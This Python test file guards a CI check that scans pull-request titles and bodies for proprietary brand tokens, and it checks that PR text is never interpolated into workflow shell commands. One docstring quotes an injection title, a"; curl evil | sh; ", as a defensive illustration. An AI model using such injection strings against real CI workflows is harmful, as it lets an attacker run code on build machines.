"""Guards on ci/check_pr_text.py — the neutrality scan for a PR's title and body.

WHY THIS EXISTS
===============
The tree gate (`ci/check_no_proprietary_refs.py`) scans two things: tracked file
contents, and commit messages in the pushed range. A pull request's **title and
body** are neither. They live only in GitHub's database, they are editable after
the PR is opened, and they are among the most public prose this project
produces — a PR page is indexed and readable by anyone, exactly like the code.

Nothing scanned them. That is not a hypothetical gap: PR text is written by hand,
by whoever opens the PR, at the moment they are thinking hardest about the
downstream consumer's requirements and least about this repository's neutrality
rule.

WHAT THIS GUARD PINS
====================
1. the detector discriminates (a clean text passes, a text carrying a token
   fails) — asserted first, so a broken detector can never certify anything;
2. the secret-availability policy, case by case;
3. the workflow wiring — a checker no workflow runs is inert;
4. that PR text is never interpolated into a shell command.

Loaded by path via importlib, never ``from ci import ...``: ``ci/`` has no
``__init__.py`` by design and CI runs the bare ``pytest ci/tests/ -q`` console
script, which does not put the CWD on sys.path (see CLAUDE.md).
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest
import yaml

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
_CHECKER_PATH = _REPO_ROOT / "ci" / "check_pr_text.py"
_WORKFLOWS_DIR = _REPO_ROOT / ".github" / "workflows"

# Obviously fake, and the only kind of token that may appear in this public
# repo's tracked source — the real ones arrive at runtime from a secret.
_SYNTHETIC_TOKEN = "zzznotarealbrand"
_OTHER_SYNTHETIC_TOKEN = "zzzalsonotreal"

_THIS_REPO = "owner/open-vedic-calc"
_A_FORK = "someone-else/open-vedic-calc"


def _load_checker():
    spec = importlib.util.spec_from_file_location("check_pr_text", _CHECKER_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _env(**overrides) -> dict[str, str]:
    """A same-repo, human-actor environment with the secret present."""
    base = {
        "PR_TITLE": "fix(ci): something entirely neutral",
        "PR_BODY": "This changes the caller-facing contract for the HTTP client.",
        "PR_HEAD_REPO": _THIS_REPO,
        "GITHUB_REPOSITORY": _THIS_REPO,
        "GITHUB_ACTOR": "a-human",
        "PROPRIETARY_REF_TOKENS": _SYNTHETIC_TOKEN,
    }
    base.update({k: v for k, v in overrides.items() if v is not None})
    for key, value in overrides.items():
        if value is None:
            base.pop(key, None)
    return base


# ---------------------------------------------------------------------------
# 1. The detector discriminates -- asserted before anything else is trusted.
# ---------------------------------------------------------------------------
def test_the_detector_discriminates() -> None:
    """A guard whose detection is broken must never certify PR text as clean.

    This is the same fail-closed ordering the workflow-token guard uses, and for
    the same reason: an earlier line-scanning version of a sibling guard printed
    a pass at exit 0 with a real regression sitting in the tree.
    """
    checker = _load_checker()
    assert checker.main(_env()) == 0, "neutral PR text was refused"
    assert checker.main(_env(PR_BODY=f"see {_SYNTHETIC_TOKEN} for context")) == 1, (
        "a brand token in the BODY was not detected"
    )
    assert checker.main(_env(PR_TITLE=f"feat: wire up {_SYNTHETIC_TOKEN}")) == 1, (
        "a brand token in the TITLE was not detected"
    )


def test_both_fields_are_scanned_not_just_one() -> None:
    """Title and body are separate fields; scanning one is scanning half."""
    checker = _load_checker()
    scanned = checker.scanned_fields(_env())
    assert {"title", "body"} <= set(scanned), (
        f"the checker does not scan both fields: {sorted(scanned)}"
    )


def test_every_supplied_token_is_active_not_only_the_first() -> None:
    """A comma-separated list must compile to a pattern per token."""
    checker = _load_checker()
    both = f"{_SYNTHETIC_TOKEN},{_OTHER_SYNTHETIC_TOKEN}"
    assert checker.main(
        _env(PROPRIETARY_REF_TOKENS=both, PR_BODY=f"about {_OTHER_SYNTHETIC_TOKEN}")
    ) == 1, "only the first token in the list was active"


def test_the_match_is_case_insensitive() -> None:
    checker = _load_checker()
    assert checker.main(_env(PR_BODY=f"About {_SYNTHETIC_TOKEN.upper()} here")) == 1


# ---------------------------------------------------------------------------
# 2. Secret availability -- the fail-closed scoping decision, case by case.
# ---------------------------------------------------------------------------
def test_the_secret_expectation_is_decided_per_case() -> None:
    """Enumerated, because "same repo" is NOT the same question as "has secrets".

    GitHub withholds repository Actions secrets from two kinds of
    ``pull_request`` run: those from a fork, and those raised by Dependabot
    (which are served from a separate Dependabot secret store). The second is
    the one a naive same-repo test gets wrong — a Dependabot branch lives IN
    this repository, so ``head.repo == repository`` is true for it, and a
    hard-fail keyed on that alone would redden every weekly dependency bump.
    """
    checker = _load_checker()
    expected = checker.tokens_expected

    assert expected(_THIS_REPO, _THIS_REPO, "a-human") is True
    assert expected(_A_FORK, _THIS_REPO, "a-human") is False, "a fork PR has no secrets"
    assert expected(_THIS_REPO, _THIS_REPO, "dependabot[bot]") is False, (
        "a Dependabot run is served from the Dependabot secret store, so the "
        "repository secret is absent through no fault of the PR"
    )
    # An unknown head repo is treated as a fork: unprovable means not expected.
    assert expected("", _THIS_REPO, "a-human") is False


def test_a_missing_secret_where_it_should_exist_is_a_HARD_FAILURE() -> None:
    """The control must never silently run at reduced strength.

    This is the fail-closed half. On a same-repo PR the secret is available, so
    an empty value means it was never provisioned or has been cleared — and a
    scan that then checks only the legacy pattern would report a clean verdict
    about brand tokens it never had.
    """
    checker = _load_checker()
    rc = checker.main(_env(PROPRIETARY_REF_TOKENS=""))
    assert rc == 2, f"an absent-but-expected secret returned {rc}, not the refusal"
    rc_unset = checker.main(_env(PROPRIETARY_REF_TOKENS=None))
    assert rc_unset == 2, "an unset secret was not refused either"


@pytest.mark.parametrize(
    "overrides",
    [
        {"PR_HEAD_REPO": _A_FORK},
        {"GITHUB_ACTOR": "dependabot[bot]"},
    ],
    ids=["fork", "dependabot"],
)
def test_where_github_withholds_the_secret_the_scan_is_advisory(overrides) -> None:
    """The fail-safe half: never redden a PR for a secret its author cannot supply."""
    checker = _load_checker()
    rc = checker.main(_env(PROPRIETARY_REF_TOKENS="", **overrides))
    assert rc == 0, (
        f"a run GitHub withholds the secret from was refused (rc={rc}) — this "
        "would redden every fork PR and every dependency bump for a reason the "
        "author cannot fix"
    )


@pytest.mark.parametrize(
    "overrides",
    [
        {"PR_HEAD_REPO": _A_FORK},
        {"GITHUB_ACTOR": "dependabot[bot]"},
    ],
    ids=["fork", "dependabot"],
)
def test_advisory_does_not_mean_permissive_about_an_actual_hit(overrides) -> None:
    """A hit is a hit. Advisory scopes the MISSING SECRET, never the verdict.

    The legacy pattern needs no secret, so it is live on every run — including
    the ones that cannot see brand tokens. Letting a match slide because the
    scan was 'only advisory' would make the advisory mode a bypass.
    """
    checker = _load_checker()
    rc = checker.main(
        _env(
            PROPRIETARY_REF_TOKENS=_SYNTHETIC_TOKEN,
            PR_BODY=f"mentions {_SYNTHETIC_TOKEN}",
            **overrides,
        )
    )
    assert rc == 1, f"a token hit on an advisory run returned {rc}, not a failure"


def test_the_advisory_says_exactly_what_it_could_not_check(capsys) -> None:
    """An advisory nobody can act on is decoration.

    It must name the gap — brand tokens unchecked, legacy pattern still live —
    so a reader knows what was and was not verified.
    """
    checker = _load_checker()
    checker.main(_env(PROPRIETARY_REF_TOKENS="", PR_HEAD_REPO=_A_FORK))
    combined = (capsys.readouterr().out + capsys.readouterr().err).upper()
    assert "ADVISORY" in combined, "the reduced-strength run did not announce itself"


def test_the_refusal_names_the_secret(capsys) -> None:
    """A refusal must be actionable: name the secret that has to be provisioned."""
    checker = _load_checker()
    checker.main(_env(PROPRIETARY_REF_TOKENS=""))
    captured = capsys.readouterr()
    assert "PROPRIETARY_REF_TOKENS" in (captured.out + captured.err)


# ---------------------------------------------------------------------------
# 3. Wiring -- a checker no workflow runs is inert.
# ---------------------------------------------------------------------------
def _workflows() -> dict[Path, dict]:
    loaded = {}
    for path in sorted(_WORKFLOWS_DIR.glob("*.yml")):
        loaded[path] = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    return loaded


def _steps_running_the_checker(self_test: bool | None = None) -> list[tuple[Path, dict, dict]]:
    """(workflow path, workflow document, step) for every step invoking it.

    ``self_test`` selects between the two kinds of step this checker gets: the
    ``--self-test`` invocation, which deliberately carries no ``env:`` because
    it builds its own fixtures, and the real scan, which must carry all of it.
    Conflating them makes an assertion about one fire on the other.
    """
    found = []
    for path, document in _workflows().items():
        for job in (document.get("jobs") or {}).values():
            for step in job.get("steps", []) or []:
                run = step.get("run") or ""
                if "check_pr_text.py" not in run:
                    continue
                is_self_test = "--self-test" in run
                if self_test is None or is_self_test == self_test:
                    found.append((path, document, step))
    return found


def test_a_workflow_step_actually_runs_the_pr_text_check() -> None:
    assert _steps_running_the_checker(self_test=False), (
        "no workflow step invokes ci/check_pr_text.py — the checker exists but "
        "never runs, so PR text is still unscanned"
    )


def test_the_self_test_runs_BEFORE_the_scan_in_the_same_job() -> None:
    """A detector that stopped matching must stop the job, not certify it green.

    Ordering is the whole point: running the self-test after the scan would let
    a broken detector report a clean PR first. This is the fail-closed ordering
    the sibling checkers use.
    """
    self_tests = _steps_running_the_checker(self_test=True)
    assert self_tests, "no workflow step runs `ci/check_pr_text.py --self-test`"

    for path, document, _step in self_tests:
        for job_name, job in (document.get("jobs") or {}).items():
            steps = job.get("steps", []) or []
            runs = [s.get("run") or "" for s in steps]
            indices = [i for i, r in enumerate(runs) if "check_pr_text.py" in r]
            if not indices:
                continue
            first_self_test = next(
                (i for i in indices if "--self-test" in runs[i]), None
            )
            first_scan = next(
                (i for i in indices if "--self-test" not in runs[i]), None
            )
            assert first_self_test is not None, (
                f"{path.name}:{job_name} scans PR text without ever proving the "
                "detector discriminates"
            )
            assert first_scan is not None and first_self_test < first_scan, (
                f"{path.name}:{job_name} runs the scan at step {first_scan} "
                f"before the self-test at {first_self_test}"
            )


def test_the_job_runs_on_pull_request_including_EDITED() -> None:
    """A body edited after opening must be re-scanned.

    ``on: pull_request`` defaults to ``opened, synchronize, reopened`` — NOT
    ``edited``. Without it, the scan can be defeated by opening a clean PR and
    then editing the leak in, and the check would still show its original green.
    """
    for path, document, _step in _steps_running_the_checker(self_test=False):
        triggers = document.get("on") or document.get(True) or {}
        assert isinstance(triggers, dict) and "pull_request" in triggers, (
            f"{path.name} runs the PR-text check but is not triggered by "
            f"pull_request: {triggers!r}"
        )
        config = triggers.get("pull_request") or {}
        types = (config or {}).get("types")
        assert types is not None, (
            f"{path.name} does not restrict pull_request types, so it takes the "
            "default set, which omits 'edited' — a body edited after opening "
            "would never be re-scanned"
        )
        assert "edited" in types, f"{path.name} pull_request types omit 'edited': {types}"


def test_the_step_receives_every_input_the_checker_reads() -> None:
    """A forwarded fact the workflow forgets is a policy decision made by accident."""
    required = {
        "PR_TITLE",
        "PR_BODY",
        "PR_HEAD_REPO",
        "GITHUB_ACTOR",
        "PROPRIETARY_REF_TOKENS",
    }
    for path, _document, step in _steps_running_the_checker(self_test=False):
        supplied = set((step.get("env") or {}).keys())
        missing = required - supplied
        assert not missing, (
            f"{path.name}'s PR-text step does not pass {sorted(missing)} — the "
            "checker would read an empty value and decide policy on it"
        )


def test_the_secret_is_passed_from_the_secrets_context() -> None:
    """Passing a literal instead of the secret would put the brand in the tree."""
    for path, _document, step in _steps_running_the_checker(self_test=False):
        value = str((step.get("env") or {}).get("PROPRIETARY_REF_TOKENS", ""))
        assert "secrets.PROPRIETARY_REF_TOKENS" in value, (
            f"{path.name} does not source the token list from the secrets "
            f"context: {value!r}. The token must never be a literal here."
        )


# ---------------------------------------------------------------------------
# 4. PR text is attacker-controlled -- it may never reach a shell as code.
# ---------------------------------------------------------------------------
def test_pr_text_is_never_interpolated_into_a_run_body() -> None:
    """``${{ }}`` is textual substitution performed BEFORE the shell runs.

    A PR title of ``a"; curl evil | sh; "`` interpolated into a ``run:`` body
    executes. Anyone can open a pull request against a public repository, so the
    title and body are attacker-controlled input. They must reach the process
    through ``env:``, which hands them over as data.

    This is asserted across EVERY workflow, not only the one added here — the
    property is about the repository, and the cheapest moment to catch a new
    violation is the commit that introduces it.
    """
    dangerous = ("github.event.pull_request.title", "github.event.pull_request.body")
    offenders = []
    for path, document, in ((p, d) for p, d in _workflows().items()):
        for job_name, job in (document.get("jobs") or {}).items():
            for step in job.get("steps", []) or []:
                run = step.get("run") or ""
                for expression in dangerous:
                    if expression in run:
                        offenders.append(f"{path.name}:{job_name}: {expression} in a run: body")
    assert not offenders, (
        "PR text is interpolated directly into a shell command:\n  "
        + "\n  ".join(offenders)
        + "\nPass it through `env:` instead — `${{ }}` substitutes text before "
        "the shell parses it, so a title carrying shell metacharacters would "
        "execute."
    )


def test_the_guard_above_examined_something() -> None:
    """"No offenders" is vacuously true of a scan that found no workflows."""
    documents = _workflows()
    assert len(documents) >= 3, f"only {len(documents)} workflows enumerated"
    steps = sum(
        len(job.get("steps", []) or [])
        for document in documents.values()
        for job in (document.get("jobs") or {}).values()
    )
    assert steps >= 20, f"only {steps} workflow steps enumerated"


# ---------------------------------------------------------------------------
# 5. The checker's own self-test, as the sibling checkers carry.
# ---------------------------------------------------------------------------
def test_self_test_passes_and_discriminates() -> None:
    checker = _load_checker()
    assert checker.self_test() == 0
